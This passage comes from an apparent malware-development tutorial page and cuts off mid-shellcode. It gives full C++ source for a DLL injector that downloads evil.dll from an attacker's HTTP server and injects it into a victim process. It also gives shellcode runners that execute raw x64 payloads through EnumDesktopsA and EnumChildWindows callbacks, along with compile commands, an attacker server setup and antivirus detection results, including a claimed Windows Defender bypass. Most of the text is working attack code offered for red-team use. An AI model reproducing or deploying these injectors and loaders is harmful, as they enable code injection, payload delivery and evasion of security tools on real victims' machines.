+HINTERNET hHttpFile = InternetOpenUrl(hSession,
+(LPCSTR)"http://192.168.56.1:4444/evil.dll",
+0, 0, 0, 0);
+DWORD dwFileSize = 1024;
+char* buffer = new char[dwFileSize + 1];
+DWORD dwBytesRead;
+DWORD dwBytesWritten;
+HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
+GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
+NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+do {
+buffer = new char[dwFileSize + 1];
+ZeroMemory(buffer, sizeof(buffer));
+
+InternetReadFile(hHttpFile, (LPVOID)buffer,
+dwFileSize, &amp;dwBytesRead);
+WriteFile(hFile, &amp;buffer[0], dwBytesRead,
+&amp;dwBytesWritten, NULL);
+delete[] buffer;
+buffer = NULL;
+} while (dwBytesRead);
+CloseHandle(hFile);
+InternetCloseHandle(hHttpFile);
+InternetCloseHandle(hSession);
+return buffer;
+}
+This function download evil.dll from attacker’s machine (192.168.56.1:4444,
+but in the real-life scenario it can be looks like evilmeowmeow.com:80) and save to
+file C:\\Temp\\evil.dll.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, we run this code in the main() function. Full source code of our injector is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil_inj.cpp
+classic DLL injection example
+author: @cocomelonc
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;wininet.h&gt;
+#pragma comment (lib, "wininet.lib")
+char evilDLL[] = "C:\\Temp\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+// download evil.dll from url
+char* getEvil() {
+HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
+INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+HINTERNET hHttpFile = InternetOpenUrl(hSession,
+(LPCSTR)"http://192.168.56.1:4444/evil.dll",
+0, 0, 0, 0);
+DWORD dwFileSize = 1024;
+char* buffer = new char[dwFileSize + 1];
+DWORD dwBytesRead;
+DWORD dwBytesWritten;
+
+HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
+GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
+NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+do {
+buffer = new char[dwFileSize + 1];
+ZeroMemory(buffer, sizeof(buffer));
+InternetReadFile(hHttpFile, (LPVOID)buffer,
+dwFileSize, &amp;dwBytesRead);
+WriteFile(hFile, &amp;buffer[0], dwBytesRead,
+&amp;dwBytesWritten, NULL);
+delete[] buffer;
+buffer = NULL;
+} while (dwBytesRead);
+CloseHandle(hFile);
+InternetCloseHandle(hHttpFile);
+InternetCloseHandle(hSession);
+return buffer;
+}
+// classic DLL injection logic
+int main(int argc, char* argv[]) {
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+LPVOID rb; // remote buffer
+// handle to kernel32 and pass it to GetProcAddress
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+char* evil = getEvil();
+// parse process ID
+if ( atoi(argv[1]) == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+}
+printf("PID: %i\n", atoi(argv[1]));
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(atoi(argv[1])));
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, evilLen,
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+// "copy" evil DLL between processes
+WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+CloseHandle(ph);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As usual, for simplicity, we create DLL which just pop-up a message box:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil.cpp
+simple DLL for DLL inject to process
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow from evil.dll!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So finally after we understood entire code of the injector, we can test it.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, compile DLL: x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, compile injector: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -lwininet -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Prepare simple web server on attacker’s machine:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 -m http.server 4444</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Make sure that the specified path exists in the victim’s machine (C:\\Temp):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, run victim process mspaint.exe and run injector hack.exe: .\hack.exe <mspaint.exe's PID></p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly :) Let’s go to upload to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/00e3254cdf384d5c1e15e217e89df9f78b73db7a 2b0d2b7f5441c6d8be804961/detection So 6 of 69 AV engines detect our file as malicious I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. InternetOpen InternetOpenUrl</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">InternetReadFile InternetCloseHandle WriteFile CreateFile <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibraryA</code> classic DLL injection source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">33. malware development tricks. Run shellcode via EnumDesktopsA. C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is the result of self-researching interesting trick: run shellcode via enumerates desktops. EnumDesktopsA Enumerates all desktops associated with the calling process’s specified window station. The function passes the name of each desktop to a callback function defined by the application: BOOL EnumDesktopsA( HWINSTA hwinsta, DESKTOPENUMPROCA lpEnumFunc, LPARAM lParam );</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. The trick is pretty simple:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - run shellcode via EnumDesktopA.
+C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/06/27/malware-injection-20.html
+
+*/
+#include &lt;windows.h&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumDesktopsA(GetProcessWindowStation(),
+(DESKTOPENUMPROCA)mem, NULL);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, first we allocate memory buffer in a current process via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then “copy” our payload to this memory region: RtlMoveMemory(mem, my_payload, sizeof(my_payload)); And then, as a pointer to the callback function in EnumDesktopsA we specify this</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">memory region: EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL); As usually, for simplicity I used meow-meow messagebox payload:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run in our victim’s machine:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">.\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is work perfectly :) Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 16 of 66 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a 833155f68b4d68bb6e565ca1/detection And what’s interesting this trick bypassed Windows Defender:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. EnumDesktopsA source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">34. malware development tricks. Run shellcode via EnumChildWindows. C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is the result of self-researching interesting trick: run shellcode via enumerates the child windows. EnumChildWindows Enumerates the child windows of the specified parent window by providing the handle to each child window to a callback function that has been created by the application. EnumChildWindows continues until either the final child window has been enumerated or the callback function returns FALSE: BOOL EnumChildWindows( HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam );</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. The trick is pretty simple, similar to previous trick:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - run shellcode via EnumChildWindows.
+C++ implementation
+
+* @cocomelonc
+* https://cocomelonc.github.io/malware/
+2022/07/13/malware-injection-21.html
+*/
+#include &lt;windows.h&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First we allocate memory buffer in a current process via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then “copy” our payload to this memory region: RtlMoveMemory(mem, my_payload, sizeof(my_payload));</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And then, as a pointer to the callback function in EnumChildWindows we specify this memory region: EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL); As usually, for simplicity I used meow-meow messagebox payload:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
